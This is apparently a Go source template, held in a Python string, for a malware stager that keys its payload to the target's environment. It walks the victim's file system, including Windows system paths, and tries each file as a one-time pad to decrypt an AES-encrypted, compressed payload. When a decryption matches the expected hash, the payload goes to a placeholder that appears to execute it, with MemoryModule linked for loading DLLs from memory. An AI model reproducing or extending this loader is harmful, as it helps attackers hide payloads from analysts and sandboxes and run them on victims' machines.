buildcode="""
package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
        {5}
)

func check(e error) bool{{
    if e != nil {{
        return false
    }}
    return true
}}


func decrypt(payload []byte, payload_hash []byte, otp string, minus_bytes int) []byte{{
    var key_location uint32
    var key_len uint16

    pad, err := os.Open(otp)

    // Decompress the payload, its zlib compressed
    
    var output bytes.Buffer
    
    data, err := base64.StdEncoding.DecodeString(string(payload))

    // this is stupid
    var b bytes.Buffer
    b.Write([]byte(data))

    r, _ := zlib.NewReader(&b)
    io.Copy(&output, r)
    r.Close()
    
    // get size of init_table
    read_location := make([]byte, 4)
    _, err = output.Read(read_location)
    if check(err) == false{{
        return nil
    }}
    
    //Set buffer to size of read_location
    buf := bytes.NewReader(read_location)
    err = binary.Read(buf, binary.LittleEndian, &key_location)
    if check(err) == false{{
        return nil
    }}

    fmt.Println("location of the key", key_location)
    
    //read key_len

    len_key := make([]byte, 2)
    _, err = output.Read(len_key)
    if check(err) == false{{
        return nil
    }}

    buf1 := bytes.NewReader(len_key)
    err = binary.Read(buf1, binary.LittleEndian, &key_len)
    if check(err) == false{{
        return nil
    }}

    iv := make([]byte, 16)
    _, err = output.Read(iv)
    if check(err) == false{{
        return nil
    }}

    fmt.Printf("[*] IV: %x\\n", iv)
    // read full table

    
    //get size of remaining
    size_of_full_table := output.Len()
    fmt.Println(size_of_full_table)
    encrypted_payload := make([]byte, size_of_full_table)
    
    _, err = output.Read(encrypted_payload)
    if check(err) == false{{
        return nil
    }}

    // Get key
    raw_key := make([]byte, key_len)

    // Find key in pad
    _, err = pad.Seek(int64(key_location), 0)
    if check(err) == false{{
        return nil
    }}

    // Read key in pad
    _, err = pad.Read(raw_key)
    if check(err) == false{{
        return nil
    }}
    
    // Print key
    fmt.Printf("[*] Raw key : %x\\n", raw_key)        
    
    kIterations := {6}
    // take sha512 of key & perform iterations
    raw_key_512 := sha512.Sum512(raw_key)
    for kIterations > 1 {{
        raw_key_512 = sha512.Sum512(raw_key_512[:])
        kIterations -= 1
    }}
    
    // chomp key to 32 bytes for 256 bit key
    password := raw_key_512[:32]

    fmt.Printf("[*] AES Key @ %x iterations: %x\\n", {6}, password)
    
    //Decrypt

    aesBlock, err := aes.NewCipher(password)
    if check(err) == false{{
        return nil
    }}

    cfbDecrypter := cipher.NewCFBDecrypter(aesBlock, iv)
    cfbDecrypter.XORKeyStream(encrypted_payload, encrypted_payload)

    encrypted_payload = bytes.TrimRight(encrypted_payload, "{{")
    
    s, err := base64.StdEncoding.DecodeString(string(encrypted_payload))
    if check(err) == false{{
        return nil
    }}

    
    fmt.Printf("[*] Encrypted Blob Length: %v\\n", len(s))
    //fmt.Printf("%v\\n", hex.EncodeToString(s)) 
    
    pad.Close()
    
    //fmt.Println("len(full_payload)", len(s))
    fmt.Printf("[*] Temp Payload Hash:\\n%x\\n",sha512.Sum512(s))
    payload_test_hash := sha512.Sum512(s[:len(s) - minus_bytes])
    fmt.Printf("[*] Search Payload Hash:\\n%x\\n", payload_test_hash)
    
    fmt.Printf("[*] Payload Hash: %x\\n", payload_hash)
    final_result := bytes.Equal(payload_test_hash[:], payload_hash[:])
    if final_result == true {{
        fmt.Println("[*] Hashes are equal!")
        return s
    }} else {{
       // fmt.Println("no, they do not match")
        return nil
    }}  

}}


/*
=======================
== Walk'in componenets
=======================
*/

//Global variable only used if parsing entire FS first
var globalFile []fileDesc
var sysNativeDone = false

//describe the file info are interested in retrieving
type fileDesc struct {{
    isDir bool
    fPath string
    sName string
}}

//used by the walk function to process directories / files
// This function gets called every file / directory in the path thats being searched
func walk_path(path string, info os.FileInfo, err error) error {{
    //temp item holder
    var item fileDesc

    //check for errors
    if err != nil {{
        fmt.Println("[!] Error Reported: ",err)
        return nil
    }}

    //determine if directory
    if info.IsDir() {{
        item.isDir = true
    }} else {{
        item.isDir = false
    }}

    //set addtional parameters into the struct
    item.fPath = path
    item.sName = info.Name()
    globalFile = append(globalFile, item)

    //You would add check code here to call the combine function to test this path
    // plus env vars meet the check
    return nil
}}

//called similar to python version
func walk_os(scan_dir string) {{
    
    //Handle 32bit in 64bit machine sysnative
    sys_paths := []string{{"c:\\\\windows", "c:\\\\windows\\\\system32"}}
    //fmt.Println("Arch: "+runtime.GOARCH)
    if strings.Contains(runtime.GOARCH, "386") == true {{
        for _, s_path_check := range sys_paths {{
            // fmt.Println("Check: "+s_path_check+" vs Check: "+scan_dir)
            if strings.Compare(strings.ToLower(scan_dir), strings.ToLower(s_path_check)) == 0 && !sysNativeDone{{
                fmt.Println("[*] Checking sysnative - searching for 64-Bit path")
                sysNativeDone = true
                filepath.Walk("c:\\\\Windows\\\\sysnative", walk_path)
            }}
            //else 32bit do nothing special, but continue to walk the given path
        }}
    }}

    //Call Walk function to process all directories
    //You can either wait here for all directories to be processed and then perform checks...
    // If you want to perform checks for each file found then do it above in the walk function
    //
    // The beauty here is that you get back (in the global value globalFile) an array of structs
    //  which you can iterate through and know if they are directories or files and then use for
    //  the appropriate function
    _ = filepath.Walk(scan_dir, walk_path)

    fmt.Printf("[*] Total FS Length %v \\n", len(globalFile))
    //fmt.Printf("%v",globalFile)
    
}}

/*
===========================
== End Walk'in componenets
===========================
*/


func main() {{
    // final hash for testing
    payload_hash, err := hex.DecodeString("{1}")
    check(err)
    
    // This is the minus bytes used in this test
    minus_bytes := int({2})
    
    scan_dir := filepath.FromSlash(`{4}`)

    // import from command line
    lookup_table := []byte("{0}")
    
    if true == strings.HasPrefix(scan_dir, "%") {{
        if true == strings.HasSuffix(scan_dir, "%") {{
            fmt.Println("[*] Using env variable for directory scanning: ", scan_dir)
            // Strip "%"
            scan_dir = scan_dir[1:len(scan_dir) - 1] 
            // Get env path
            scan_dir = os.Getenv(scan_dir)
            fmt.Println("[*] Resolved Path for Scanning: ", scan_dir)
            if scan_dir == ""{{
                os.Exit(0)
            }}
        }}
    }}

    walk_os(scan_dir)

    fmt.Println("[*] Number of Path Items to Iterate: ", len(globalFile))
    //fmt.Println(globalFile)
    var full_payload []byte
    for _, itr := range globalFile{{
        fmt.Printf("[*] Testing File:  %v", itr.fPath)

        // if it is a directory, continue
        if itr.isDir == true {{
            continue
        }}
        full_payload = decrypt(lookup_table, payload_hash, itr.fPath, minus_bytes)
        if full_payload != nil{{
            //fmt.Println("not nil")
            break
        }}
    
    }}

    if full_payload == nil{{
        fmt.Println("[!] No Match Found - Exiting")
        os.Exit(1)
    }}

    fmt.Println("[*] Length of Decrypted Payload: ", len(full_payload))
    
    //full_payload := decrypt(payload, payload_hash, otp, minus_bytes)

    //fmt.Println(len(full_payload))
    
    {3}
    
}}
"""